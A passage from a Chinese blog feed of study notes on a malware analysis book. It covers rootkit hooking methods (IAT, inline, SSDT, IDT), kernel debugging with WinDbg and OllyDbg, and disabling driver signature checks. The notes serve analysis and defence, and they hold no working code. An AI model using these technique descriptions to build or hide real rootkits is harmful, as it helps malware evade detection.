token）是一个包含进程安全描述符的对象。安全描述符用来指定拥有者的访问权限。</p><p>SeDebugPrivilege特权作为一个系统级别调试的工具被创建，但是恶意代码编写者用它来获取系统进程拥有的所有权限。默认情况下，SeDebugPrivilege只赋给本地管理员账户，基本可以认为赋予用户SeDebugPrivilege权限就等于给予他们本地系统账户权限。普通的用户账号不能给自身赋予SeDebugPrivilege权限，它的这种请求会被拒绝。</p><h2 id="11x6-隐藏它的踪迹——用户态的Rootkit"><a href="#11x6-隐藏它的踪迹——用户态的Rootkit" class="headerlink" title="11x6 隐藏它的踪迹——用户态的Rootkit"></a>11x6 隐藏它的踪迹——用户态的Rootkit</h2><p>恶意代码经常不遗余力地对用户隐藏它的生存机制和正在运行的进程。常用来隐藏恶意代码行为的工具被称为Rootkit。</p><p>Rootkit有多种存在形式，但是大部分Rootkt通过修改操作系统内部的功能来工作。这种修改可以使恶意代码的文件、进程、网络连接以及其他资源对其他程序隐藏，这也使得反病毒产品、管理员以及安全分析人员难以发现它们的恶意活动。</p><p>一些Rootkt会修改用户态的应用程序，但大部分会修改内核，因为保护机制（例如入侵防护系统）都运行在内核层。当它们运行在内核层而不是用户层时，Rootkit和入侵防御机制都很有效。在内核层，Rootkit比在用户层更容易破坏操作系统。</p><p>处理用户态安装挂钩Rootkit的一种较好策略是：先确定挂钩的位置，然后找出挂钩都干了什么。</p><h3 id="1-IAT-Hook"><a href="#1-IAT-Hook" class="headerlink" title="1. IAT Hook"></a>1. IAT Hook</h3><p>IAT Hook是用户空间中一种经典的Rootkit方法，它隐藏本地系统中的文件、进程以及网络连接。这种挂钩方法修改导入地址表（IAT）或者导出地址表（EAT）。</p><p>IAT Hook是一种过时且容易探测的挂钩方式，因此现代的Rootkit都使用更高级的inline Hook方法代替。</p><h3 id="2-Inline-Hook"><a href="#2-Inline-Hook" class="headerlink" title="2. Inline Hook"></a>2. Inline Hook</h3><p>Inline Hook是通过覆盖导入DLL中APl函数的代码来实现的，所以它必须等到DLL被加载后才能执行。IAT Hook只简单地修改函数指针，但Inline Hook将修改实际的函数代码。</p><p>恶意Rootkit通常用一个跳转指令替换函数的开始代码来执行Inline Hook，这个跳转指令使Rootkit插入的恶意代码获取执行。另外，Rootkit还可以通过改变函数的代码来破坏它或者改变它，而不是跳转到恶意代码。</p><p>From <a href="https://kabeor.github.io/第11章  恶意代码行为/">https://kabeor.github.io/第11章  恶意代码行为/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第11章-恶意代码行为&quot;&gt;&lt;a href=&quot;#第11章-恶意代码行为&quot; class=&quot;headerlink&quot; title=&quot;第11章  恶意代码行为&quot;&gt;&lt;/a&gt;第11章  恶意代码行为&lt;/h1&gt;&lt;h2 id=&quot;11x1-下载器和启动器&quot;&gt;&lt;a href=&quot;#11x
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第10章  使用WinDbg调试内核</title>
    <link href="https://kabeor.github.io/%E7%AC%AC10%E7%AB%A0%20%20%E4%BD%BF%E7%94%A8WinDbg%E8%B0%83%E8%AF%95%E5%86%85%E6%A0%B8/"/>
    <id>https://kabeor.github.io/第10章  使用WinDbg调试内核/</id>
    <published>2018-07-22T12:50:32.076Z</published>
    <updated>2018-07-22T12:51:08.168Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第10章-使用WinDbg调试内核"><a href="#第10章-使用WinDbg调试内核" class="headerlink" title="第10章  使用WinDbg调试内核"></a>第10章  使用WinDbg调试内核</h1><p>本章将探索使用WinDbg进行内核调试和Rootkit分析的方法。</p><h2 id="10x1-驱动与内核代码"><a href="#10x1-驱动与内核代码" class="headerlink" title="10x1 驱动与内核代码"></a>10x1 驱动与内核代码</h2><p>Windows设备驱动简称为驱动，它让第三方开发商在Windows内核模式下运行代码。</p><p>由于驱动程序常驻内存，并且负责响应用户态应用程序的请求，因此分析它十分困难。另外，由于应用程序不直接与驱动程序通信，而是直接访问设备对象，向具体的物理设备发送请求，使得<br>驱动程序更加难以分析。设备对象由驱动程序创建和销毁，可以被用户态的程序直接访问，但它们并非一定是真实的物理设备。</p><p>为了系统能够正常工作，驱动程序必须加载到内核空间，这与DLL需加载到进程空间是同样的道理。当驱动首次被加载时，DriverEntry函数将被调用，这与DLLMain相似。</p><p>与DLL通过函数导出表提供其功能接口不同，驱动通过注册回调函数来提供功能。当用户态的应用程序请求一个服务时，这些回调函数将会被调用。回调函数在DriverEntry程序中被注册。</p><p>Windows会为每个驱动创建一个驱动对象，并以参数形式将其传给DriverEntry函数，DriverEntry函数用回调函数填充这个驱动对象。然后DriverEntry会创建一个可以被用户态应用程序访问的设<br>备对象，应用程序与驱动的交互请求都将通过这个设备对象进行。</p><p>考虑来自用户态应用程序的一个读数据请求。最终这个请求被发送到负责管理硬件并存储读入数据的驱动程序。首先，用户态应用程序应该获得该硬件设备的一个文件句柄，然后在该句柄上调<br>用函数ReadFile。接着内核将会处理ReadFile函数的请求，最终由驱动程序的回调函数来响应对I/O设备的读请求。</p><p>请求内核态恶意组件的最常见函数是DeviceIoControl，它是从用户态模块到内核设备的一种通用请求方法。使用该函数时，用户态应用程序传递一个任意长度的缓冲区数据作为输入，并且接<br>收一个任意长度的缓冲区数据作为输出。</p><p>用户态应用程序到内核态驱动的调用由操作系统完成，这种调用难以被跟踪．如图展示了请求从用户态程序发起并最终到达一个内核驱动的过程。从图中可以看出，请求由用户态程序发起，最后到达内核驱动。在发送到内核的请求中，一部分请求发送到设备驱动去控制硬件设备，而另外一部分仅仅影响一些内核的内部状态。<br><img src="https://i.loli.net/2018/07/22/5b545fac1cab8.jpg" alt="im"></p><p>恶意驱动通常不控制硬件设备，而是与Windows操作系统主要的内核组件ntoskrnl. exe、hal.dll进行交互。ntoskrnl.exe组件包含操作系统核心功能的代码，hal.dll包含与主要硬件设备交互的代码。恶意代码常通过从一个或者多个这样的内核组件中导入函数，来操纵内核。</p><h2 id="10x2-安装内核调试"><a href="#10x2-安装内核调试" class="headerlink" title="10x2 安装内核调试"></a>10x2 安装内核调试</h2><p>内核调试比起用户模式调试来说更加复杂，因为进行内核调试时，操作系统将被冻结，这种情况下不可能运行调试器。因此，调试内核的常用方法是使用VMware。</p><p>与用户态调试不同，内核调试需要一些初始化设置。首先需要设置虚拟操作系统并开启内核调试，然后配置VMware使虚拟机与宿主系统之间有一条虚拟化的串口，同时还应该配置宿主操作系统中的WinDbg。</p><p>虚拟操作系统的设置是编辑C:\boot.ini(Windows XP下请确保文件夹选项设置为显示隐藏文件)。该文件在系统中通常是隐藏的。建议在编辑boot.ini文件之前，为你的虚拟操作系统做一个快照，如果配置文件错误或者损坏了boot.ini，你可以使用快照还原系统。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[boot loader]</span><br><span class="line">timeout=30</span><br><span class="line">default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS</span><br><span class="line">[operating systems]</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)WINDOWS=&quot;Microsoft Windows XP Professional&quot;   编号1</span><br><span class="line">/noexecute=optin /fastdetect</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional with Kernel Debugging&quot;   编号2</span><br><span class="line">/noexecute=optin /fastdetect /debug /debugport=COM1/baudrate=115200</span><br></pre></td></tr></table></figure><p>以Windows XP为例，代码中编号1处指明默认加载的操作系统。编号2处是为了设置内核调试而加入的一行。通常你系统中的boot.ini与编号1类似．</p><p>复制系统中boot.ini最后一行，然后粘贴到boot. ini中新的一行，除了你应该加入的附加选项<code>/debug /debugport=COMl /baudrate=115200</code>外．其他项均与上一行相同(不用考虑行上其他的元素，如<code>multi(0)disk(0)</code>，简单的完全复制，只需加入附加选项）。其中<code>/debug</code>标记代表开启内核调试，<code>/debugport=COM1</code>标记告诉系统使用哪个端口来连接调试系统与被调试系统，<code>/baudrate=115200</code>标记用来指定串口数据传输速率。在本例中，我们使用VMware创建的串口。为了方便识别开机系统选项，我们将第二启动项命为“Microsoft Windows XP Professional with Kernel Debugging”。</p><p>当下次开机运行你的虚拟操作系统时，系统会提供一个开启内核调试的选项’止你选择。另外，系统会给你30秒的时间，决定是否以调试模式启动系统。如果想要连接内核调试器（即WinDbg），你需要在每次开机时选择调试版本启动项。</p><p>下一步，需要设置VMware，在虚拟操作系统和宿主操作系统之间创建一个虚拟连接。为此，我们在VMware上添加一个新的设备来使用宿主系统中的一个命名管道上的串口。下面是添加设备的步骤：</p><p><strong>1. 单击VM-&gt;Settings．然后会弹出VMware设置对话框。</strong><br><strong>2. 在VMware设置对话框中，单击右下角的Add按钮，在弹出的设备类型选择窗口中选择Serial Port，然后单击下一步。</strong><br><strong>3. 在请求串口类型的对话框中，选择Output to Named Pipe，然后单击下一步。</strong><br><strong>4. 在接下来的窗口中，输入\.\pipe\com_1对管道进行命名，然后选择This end is the server和The other end is an application。</strong><br><strong>5. 选中Yield CPU on poll单选框。</strong></p><p><img src="https://i.loli.net/2018/07/22/5b5468e9c465b.jpg" alt="enter description here"></p><p>完成虚拟机的配置后启动虚拟机。在宿主操作系统中，使用下列步骤使WinDbg连接虚拟机并开始调试内核。<br><strong>1．启动WinDbg。</strong><br><strong>2．选择File—Kemel Debug．单击COM标签，然后输入文件名和先前在boot.ini文件中设置的波特率</strong></p><p>如果虚拟操作系统处于运行状态，调试器会在数秒内连接到虚拟机操作系统。如果虚拟操作系统没有运行，调试器将处于等待，直到虚拟操作系统启动，启动过程中调试器将连接到被调试系统。调试器连接后，为了更加全面地获取到调试过程发生的事件，建议在调试过程中启用详细信息输出功能。启用详细信息输出功能后，每当驱动程序被加载和卸载时，你将会得到通知。这些信息在某些情况下可以帮助你识别恶意驱动的加载。</p><h2 id="10x3-使用WinDbg"><a href="#10x3-使用WinDbg" class="headerlink" title="10x3 使用WinDbg"></a>10x3 使用WinDbg</h2><h3 id="1-从内存中读取"><a href="#1-从内存中读取" class="headerlink" title="1. 从内存中读取"></a>1. 从内存中读取</h3><p>WinDbg的内存窗口支持直接通过命令来浏览内存。命令d是用来读取如程序数据或堆栈等内存位置的命令。</p><blockquote><p>基本语法</p></blockquote><p><code>dx addressToRead</code><br>这里x是显示数据格式的一个选项。<br><img src="https://i.loli.net/2018/07/22/5b546adbe93c1.jpg" alt="几种显示数据常用的方式"></p><p>e命令使用方法相同，来改变内存的值<br><code>ex addressToWrite dataToWrite</code><br>其中x与dx命令中的x值相同</p><h3 id="2-使用算术操作符"><a href="#2-使用算术操作符" class="headerlink" title="2. 使用算术操作符"></a>2. 使用算术操作符</h3><p>WinDbg支持在命令行中使用简单的算术操作符，对内存和寄存器进行直接操作，如加(+)、减（-）、乘(* )、除(/)。在试图创建一个条件表达式断点时，命令行选项就如快捷方式一样好用。</p><p>命令dwo用来解引用一个32位的指针，并查看该指针代表地址的值。</p><h3 id="3-设置断点"><a href="#3-设置断点" class="headerlink" title="3. 设置断点"></a>3. 设置断点</h3><p>在WinDbg调试器中，bp命令用来设置基本断点。同时WinDbg也可以使用一些命令，这些命令可以在断点触发时、控制转给用户之前自动运行。使用go(g)命令在断点处执行一个动作后继续执行，而不用等待用户。</p><h3 id="4-列举模块"><a href="#4-列举模块" class="headerlink" title="4. 列举模块"></a>4. 列举模块</h3><p>在OllyDbg调试中，内存映射可以列举出所有内存段与加载模块，但是WinDbg却没有相似的功能。然而,WinDbg的lm命令可以列举出加载到进程空间的所有模块，包括用户模式下的可执行模块,DLL以及内核模式下的内核驱动，同时也会列举出每个模块的起始与结束地址。</p><h2 id="10x4-微软符号表"><a href="#10x4-微软符号表" class="headerlink" title="10x4 微软符号表"></a>10x4 微软符号表</h2><p>调试符号表提供了有限的源代码信息，来帮助理解汇编代码。微软提供的调试符号表中包含某些函数和变量的名字。</p><p>在这里所说的调试符号就是某个特定内存地址的一个名称，大多数调试符号提供一个地址名称来表示一个函数，也有一些地址名称表示数据地址。</p><h3 id="1-搜索符号"><a href="#1-搜索符号" class="headerlink" title="1. 搜索符号"></a>1. 搜索符号</h3><p>WinDbg中符号的格式如下所示<br><code>moduleName!symbolName</code></p><p>这种语法可以在任意一个拥有正常地址的地方使用。其中moduleName表示.exe、.dll或者.sys格式文件的文件名（不包括其扩展名）。symbolName是与这个地址相关联一个名字。然向，ntoskrnl.exe是一个特例，它的module Name是nt，而不是ntoskrnl。</p><p>bu命令允许你用符号在没有加载的代码中设置一个延迟断点。延迟断点是一个断点，仅当加载一个名字匹配的模块时，延迟断点才会被设置。</p><p>x命令允许你使用通配符来搜索函数或符号。</p><p>Ln用来列出最接近给定内存地址的符号，它可以用来确认指针指向的函数。</p><h3 id="2-查看结构信息"><a href="#2-查看结构信息" class="headerlink" title="2. 查看结构信息"></a>2. 查看结构信息</h3><p>微软符号也包含多个数据结构的类型信息，包括没有被公开的内部类型。对于恶意代码分析人员，这些信息非常有用，因为恶意代码经常操作未公开的数据结构。</p><h3 id="3-配置Windows符号表"><a href="#3-配置Windows符号表" class="headerlink" title="3. 配置Windows符号表"></a>3. 配置Windows符号表</h3><p>符号表依赖于被分析文件的具体版本，它们随着文件的更新或修复而改变。如果配置正确。WinDbg将查询微软的服务器，自动获得正在调试文件的正确符号表。你可以通过选择File-&gt;Symbol File Path，来设置符号文件路径。为了配置WinDbg，让其使用在线符号服务器，输入以F路径：<br><code>SRV*c:\websymbols*http://msdl.microsoft.com/download/symbols</code><br>SRV配置了一个服务器，路径C:\websymbols是符号信息的本地缓存，网址则是微软符号服务器的<br>固定位置。</p><p>如果要调试的机器并不能一直连接互联网，你可以根据你使用操作系统、服务包、机器的体系结构等信息，手动从微软服务器下载指定的符号包。符号文件通常有几百兆大小，因为它们包含操作系统和服务包的所有修改和补丁版本的符号信息。</p><h2 id="10x5-内核调试实践"><a href="#10x5-内核调试实践" class="headerlink" title="10x5 内核调试实践"></a>10x5 内核调试实践</h2><p>对于恶意代码编码者，从内核空间写文件的好处是更加难以被觉察。虽然不是以秘密方式写入一个文件，但是它可以绕过一些安全产品，同时也可以误导那些试图查找用户空间中CreateFile、WriteFile函数调用证据的恶意代码分析师。呈现在恶意代码编写者面前的一个挑战是：在内核模式中，普通Win32函数不能直接被调用。但在内核模式下有相似的函数，这些函数可以被内核态的恶意代码所使用。由于CreateFile和WriteFile函数在内核模式下不可用，所以内核模式下提供NtCreateFile和NtWriteFile函数作为替代。</p><h3 id="1-用户空间的代码"><a href="#1-用户空间的代码" class="headerlink" title="1. 用户空间的代码"></a>1. 用户空间的代码</h3><h3 id="2-内核模式的代码"><a href="#2-内核模式的代码" class="headerlink" title="2. 内核模式的代码"></a>2. 内核模式的代码</h3><h3 id="3-查找驱动对象"><a href="#3-查找驱动对象" class="headerlink" title="3. 查找驱动对象"></a>3. 查找驱动对象</h3><h2 id="10x6-Rootkit"><a href="#10x6-Rootkit" class="headerlink" title="10x6 Rootkit"></a>10x6 Rootkit</h2><p>Rootkit通过修改操作系统内部函数,来隐藏自己存在的痕迹。通过这种修改, Rootkit可以隐藏一个正在运行程序的文件、进程、网络连接以及其他资源。这使得其恶意活动难以被反病毒产品、管理员以及安全分析员发现。</p><p>现在大部分 Rootkit都是通过采用某种方式修改操作系统内核来工作的。尽管 Rootkit可以使用多种隐藏技术,但在实际应用中,系统服务描述表(SSDT: System Service Descriptor Table)挂钩技术的使用程度远远超过其他技术。这种技术已经有几年的历史,与其他 rootkits技术相比,它更容易被探测。然而,由于它容易理解、实现灵活且容易,因此到现在它依然被恶意代码所使用。</p><p>系统服务描述表(SSDT),也称为系统服务分发表,微软使用它来查找进入内核的系统调用,它通常不被第三方应用程序或者驱动程序访问。内核态代码只能被用户态的<br>SYSCALL、 SYSENTER或INT 0x2E指令来访问。当前 Windows版本( Windows XP之后)使用 SYSENTER指令,它从存储在寄存器EAX的函数代码中获取指令。</p><h3 id="1-Rootkit分析实践"><a href="#1-Rootkit分析实践" class="headerlink" title="1. Rootkit分析实践"></a>1. Rootkit分析实践</h3><blockquote><p>一个 Rootkit挂钩SSDT的例子</p></blockquote><p>分析一个假设已感染的系统,并认为系统已经安装有恶意驱动。</p><p>首先最直接的方式是检查SSDT是否被挂钩,在 WinDbg中通过存放在nt!KeServiceDescriptorTable表中的偏移量查看SSDT表。SSDT表中所有函数偏移量都应该指向位于NT模块地址范围内的函数,所以我们首先要做的工作就是获取NT模块的地址边界。如果 Rootkit挂钩了其中的某个函数,则这个函数指针可能不在NT模块的地址范围内。当我们检查SSDT时,应该观察其函数指针是否在NT模块的地址范围内。</p><h3 id="2-中断"><a href="#2-中断" class="headerlink" title="2. 中断"></a>2. 中断</h3><p>有时．Rootkit会使用中断来干扰系统事件。现代的处理器实现了用硬件方式触发软件事件的中断。系统发送一条命令到硬件，硬件处理完请求事件后会中断处理器。</p><p>有时，驱动或者Rootkit会利用中断来执行代码，驱动程序调用IoConnectlnterrupt函数为特定中断注册一个处理程序，然后为这个中断指定一个中断服务例程(ISR)，每当触发该中断时，系统都会调用注册的中断服务例程。</p><p>中断描述表(IDT)存储着ISR的信息，在WinDbg中可以通过lidt命令查看</p><p>如果中断位于一个没有名字、没有签名或可疑的驱动中,则表明存在 Rootkit或者恶意代码。</p><h2 id="10x7-加载驱动"><a href="#10x7-加载驱动" class="headerlink" title="10x7 加载驱动"></a>10x7 加载驱动</h2><p>假设你拥有一个恶意的驱动程序,但没有用户态应用程序安装它,这个时候就可以用如 OSR Driver Loader的加载工具来加载它。 OSR Driver Loader驱动加载器非常容易使用而且免费,但需要注册。一旦安装了 OSR Driver Loader,只需在它运行后指定需要加载的驱动,然后单击 Register Service和 Start Service就可以启动驱动。</p><h2 id="10x8-Windows-vista、-Windows7和x64版本的内核问题"><a href="#10x8-Windows-vista、-Windows7和x64版本的内核问题" class="headerlink" title="10x8 Windows vista、 Windows7和x64版本的内核问题"></a>10x8 Windows vista、 Windows7和x64版本的内核问题</h2><p>Vista及之后的Windows版本使用一个名为BCDEdit的程序来编辑引导配置数据，因此你可以在新版本的Windows操作系统中，使用BCDEdit开启内核调试。</p><p>在安全方面，最大的改变是使用了一种内核保护补丁机制，通常被称为PatchGuard，这种机制从Windows XP开始在x64系统上实施。内核补丁保护能够阻止第三方程序修改内核，这包括修改内核代码自身、修改系统服务表、修改IDT以及其他补丁修改技术。引入这种功能时存在一定程度上的争议，因为不仅恶意程序使用内核补丁，正常程序也使用它。</p><p>同时，在64位系统中，内核补丁保护也能干扰调试过程，因为调试器在插入断点时会修改代码。因此．如果内核调试器在系统引导时附加到系统的话，补丁保护将不会运行。如果系统引导结束后再将内核调试器附加到系统．PatchGuard将会使系统崩溃。</p><p>从64位版本的Vista开始．Windows强制执行驱动签名机制，这也就意味着在没有数字签名的情况下，你不能将驱动加载到Windows Vista系统中。因为恶意代码通常不会使用数字签名，所以这是一种对抗恶意内核驱动的有效安全措施。事实上．x64系统上的恶意内核驱动实际上还不存在，但是随着x64版本的Windows越来越普及，恶意代码无疑将会解决这一个障碍。如果你需要加载一个未签名的驱动到x64的Vista系统中，你可以使用BCDEdit工具去修改引导项。具体来说就是将要求驱动签名的功能关闭，即关闭nointegritychecks。</p><p>From <a href="https://kabeor.github.io/第10章  使用WinDbg调试内核/">https://kabeor.github.io/第10章  使用WinDbg调试内核/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第10章-使用WinDbg调试内核&quot;&gt;&lt;a href=&quot;#第10章-使用WinDbg调试内核&quot; class=&quot;headerlink&quot; title=&quot;第10章  使用WinDbg调试内核&quot;&gt;&lt;/a&gt;第10章  使用WinDbg调试内核&lt;/h1&gt;&lt;p&gt;本章将探索使用W
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第9章 OllyDbg</title>
    <link href="https://kabeor.github.io/%E7%AC%AC9%E7%AB%A0%20OllyDbg/"/>
    <id>https://kabeor.github.io/第9章 OllyDbg/</id>
    <published>2018-07-20T03:35:55.262Z</published>
    <updated>2018-07-22T10:31:28.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h1><p>OllyDbg被普遍用来分析恶意代码之前,最初的用途是破解软件。 Immunity Security公司买下 OllyDbg1.1的基础代码,并将其更名为Immunity Debugger(ImmDbg)。在此之前, OllyDbg直都是恶意代码分析师和漏洞开发者们的首选调试器。Immunity的目的是使这个工具适合漏洞开发者们使用,并且修复了OllDbg中的一些Bug。<br>在完成 OllyDbg的外观GUI修改,提供带有完整功能的 Python解释器API后,一些用户开始用ImmDbg替代OllyDbg</p><h2 id="9x1-加载恶意代码"><a href="#9x1-加载恶意代码" class="headerlink" title="9x1 加载恶意代码"></a>9x1 加载恶意代码</h2><h3 id="1-打开一个可执行文件"><a href="#1-打开一个可执行文件" class="headerlink" title="1. 打开一个可执行文件"></a>1. 打开一个可执行文件</h3><p>选择OllyDbg界面中的File-&gt;Open, 然后浏览到要加载的可执行文件。<br>如果要调试的程序需要参数,则在Open对话框的 Arguments输入框给出(只能在加载期间给OllyDgb传入命令行参数)</p><p>默认情况下,如果能够确定软件的入口点位置,即 WinMain, OllyDbg会在这个位置暂停程序的执行。否则OllyDbg会在软件PE头部提供的入口点处中断。另外,你也可以选择 OllyDbg的DebuggingOptions菜单(Options→Debugging Options)来修改这些启动选项。</p><h3 id="2-附加调试器到一个运行程序"><a href="#2-附加调试器到一个运行程序" class="headerlink" title="2. 附加调试器到一个运行程序"></a>2. 附加调试器到一个运行程序</h3><p>为将OllyDbg附加到一个进程上,选择OllyDbg界面的File→ Attach。然后会弹出一个菜单,你可以在这个菜单中选择要附加的进程(如果有多个同名的进程,你需要知道调试进程的ID)。接下来选择要调试的进程,并从菜单中选择Attach。此刻OllyDbg会立即暂停这个程序以及它所有的线程。</p><p>OllyDbg附加上进程后,进程当前执行线程的代码会被暂停,并显示在OllyDbg的窗口中。然而，有可能在进程正在执行一个系统DLL中的指令时把它暂停了,当这种情况发生时,回到主代码最简单的办法就是在整个代码段中设置一个访问断点。这样就会让这个程序在下次访问代码段时中断执行。</p><h2 id="9x2-OllyDbg的接口"><a href="#9x2-OllyDbg的接口" class="headerlink" title="9x2 OllyDbg的接口"></a>9x2 OllyDbg的接口</h2><blockquote><p> <strong>反汇编面板窗口</strong><br> 这个窗口显示了被调试程序的代码一当前指令指针的前后一些指令。通常，下一条将要被执行的指令在这个窗口中高亮显示。如果想要修改指令或数据(或添加一些汇编指令),请在这个窗口中按空格键。</p><p><strong>寄存器面板窗口</strong><br>这个窗口用来显示被调试程序寄存器的当前状态，代码被调试时，如果一条指令运行过程中修改了寄存器的值，则寄存器窗口中的这个寄存器就会从黑色变为红色。</p><p><strong>栈面板窗口</strong><br>这个窗口用来显示被调试线程堆栈在内存中的当前状态。这个窗口总是显示给定线程的栈项。可以通过右击一个栈单元，选择Modify，来操作这个窗口中的栈。OllyDbg会在一些栈单元上显示一些有用的注释，这些注释描述了调用一个API之前栈中存放的参数。</p><p><strong>内存转储面板窗口</strong><br>这个窗口用来显示被调试进程的实时内存转储。在这个窗口中按CtrI+G组合键，并输入一个内存位置，可以跳转到任何内存地址（也可以单击一个内存地址，然后选择Follow in Dump，来转储那个内存地址）。如果想要编辑这个窗口中的内存，右击它并选择Binary-&gt;Edit。使用这种方式也可以修改恶意代码存储在RAM中的全局变量以及其他一些数据。</p></blockquote><h2 id="9x3-内存映射"><a href="#9x3-内存映射" class="headerlink" title="9x3 内存映射"></a>9x3 内存映射</h2><p>内存映射窗口( View-&gt;Memory)显示了被调试程序分配的所有内存块。<br>内存映射是查看程序在内存中布局的一个好方式。你可以双击内存映射中的任意一行，显示那个段的内存转储。你也可以通过右击一段内存转储，然后选择View in Disassembler的方式，将其中的数据发送到反汇编窗口。</p><h3 id="1-基地址重定位"><a href="#1-基地址重定位" class="headerlink" title="1. 基地址重定位"></a>1. 基地址重定位</h3><p>内存映射能够帮助你理解一个PE文件在运行时如何被重定位。基地址重定位是指Windows中的一个模块没有被加载到其预定基地址时发生的情况。</p><blockquote><p><strong>基地址</strong><br>   Windows中的所有PE文件都有一个预定的基地址，它在PE文件头中被称为映像基地址。</p><p>  Windows允许映像基地址与要被加载到内存的实际地址不一致，虽然大部分情况下是一致的。大部分执行程序都被预定加载到0x00400000处，这个地址是Windows平台下大多数编译器使用的默认地址。不过，开发者可以选择将执行程序的基地址设置为一个与此不同的地址。支持地址空间布局随机化( ASLR)安全增强特性的可执行程序会经常被重定位。这就是说.DLL的重定位变得更加普遍。<br>    因为一个应用程序可能导入许多DLL，而每个DLL都有一个希望被加载到内存中的预定基地址，所以重定位十分必要。假设有两个DLL被加载，并且它们拥有相同的预加载地址0x10000000，则它们不可能都加载到这个位置,Windows会将其中一个DLL加载到这个地址，另一个DLL重定位到另外某个地址。<br>    Windows操作系统自带的大多数DLL有不同的预定基地址，而且它们之间不会产生冲突。然而第三方应用程序会经常出现使用同一个预定基地址的情况。</p><p><strong>绝对地址与相对地址</strong><br>重定位过程比简单将代码加载到另一个位置要复杂得多。虽然多数指令会引用内存中的相对地址，但是有些却引用内存的绝对地址。</p></blockquote><h2 id="9x4-查看线程和堆栈"><a href="#9x4-查看线程和堆栈" class="headerlink" title="9x4 查看线程和堆栈"></a>9x4 查看线程和堆栈</h2><p>恶意代码经常使用多线程。你可以通过选择View-&gt;Threads，调出线程面板窗口，查看一个程序的当前线程。这个窗口显示了线程的内存位置，以及它们当前的活动状态（活动、暂停，或者挂起）。<br>    由OllyDbg是单线程的，可能需要你先暂停所有的线程，设置一个断点后，继续运行程序，这样可以确保在一个特定线程内调试。单击主工具栏中的暂停按钮，可以暂停所有活动的线程。</p><h2 id="9x5-执行代码"><a href="#9x5-执行代码" class="headerlink" title="9x5 执行代码"></a>9x5 执行代码</h2><p><img src="https://i.loli.net/2018/07/20/5b519235da3c2.jpg" alt="im"></p><h2 id="9x6-断点"><a href="#9x6-断点" class="headerlink" title="9x6 断点"></a>9x6 断点</h2><p><img src="https://i.loli.net/2018/07/20/5b5192c91c650.jpg" alt="enter description here"></p><h3 id="1-软件断点"><a href="#1-软件断点" class="headerlink" title="1. 软件断点"></a>1. 软件断点</h3><p>调试字符串解码函数时，软件断点特别有用。</p><h3 id="2-条件断点"><a href="#2-条件断点" class="headerlink" title="2. 条件断点"></a>2. 条件断点</h3><p>条件断点是软件断点的一种，只有某些条件得到满足时这个断点才能中断执行程序。OllyDbg调试器允许使用表达式，来设置断点，每当断点命中时，都会先计算表达式的值，如果其值不等于零，断点生效，程序运行中断。</p><p>对于调用频繁的API函数，仅当特定参数传给它时才中断程序执行，这种情况下，条件软件断点特别有用。</p><blockquote><p><strong>设置条件断点的步骤</strong></p><ol><li>右击反汇编面板窗口中函数的第一条指令，选择Breakpoint-&gt;Conditional。然后会弹出一个对话框，要求你输入条件表达式.</li><li>在步骤l弹出的对话框中输入表达式，然后单击OK按钮。</li><li>单击Play按钮，并等待条件断点命中。</li></ol></blockquote><h3 id="3-硬件断点"><a href="#3-硬件断点" class="headerlink" title="3. 硬件断点"></a>3. 硬件断点</h3><p>硬件断点非常强大，它可以在不改变你的代码、堆栈以及任何目标资源的前提下进行调试。</p><p>OllyDbg中，在某一指令上设置硬件断点的方法是：右击该指令选择Breakpoint-&gt;Hardware，on Execution。</p><p>通过使用Debugging Options菜单，你可以告诉OllyDbg默认使用硬件断点来代替软件断点。同时，使用硬件断点可以帮助你防御反调试技术，如软件断点扫描。</p><h3 id="4-内存断点"><a href="#4-内存断点" class="headerlink" title="4. 内存断点"></a>4. 内存断点</h3><p>在一个内存块上设置内存断点，可以让被调试程序在访问这段内存时中断执行。OllyDbg支持软件内存断虑和硬件内存断点，此外还支持对内存进行读、写、执行或其他权限访问是否产生中断的设置。</p><p>为了设置一个基本的内存断点，在内存转储面板窗口中选择一部分内存，或者在内存映射面板窗口中选择一个内存段，然后右击它，选择Breakpoint-&gt;Memory,on Access。OllyDbg只允许你一次设置一个内存断点。如果你设置了一个新的内存断点，那么之前设置的内存断点会被移除。</p><p>在分析恶意代码时，如果想知道恶意代码何时使用了某个加载的DLL，这时内存断点将变得特别有用。可以设置这样一个内存断点，当DLL中的代码运行时程序被中断。下面是实现这种功能的步骤：</p><blockquote><p>1．打开内存映射面板窗门，并右i键单击需要跟踪DLL的.text段（.text段包含DLL的可执行代码）。<br>2．选择Set Memory Breakpoint on Access.<br>3．按F9键或者单击Play按钮恢复程序运行。<br>    当心用程序运行到DLL的．text段代码时．会中断执行。</p></blockquote><h2 id="9x7-加载DLL"><a 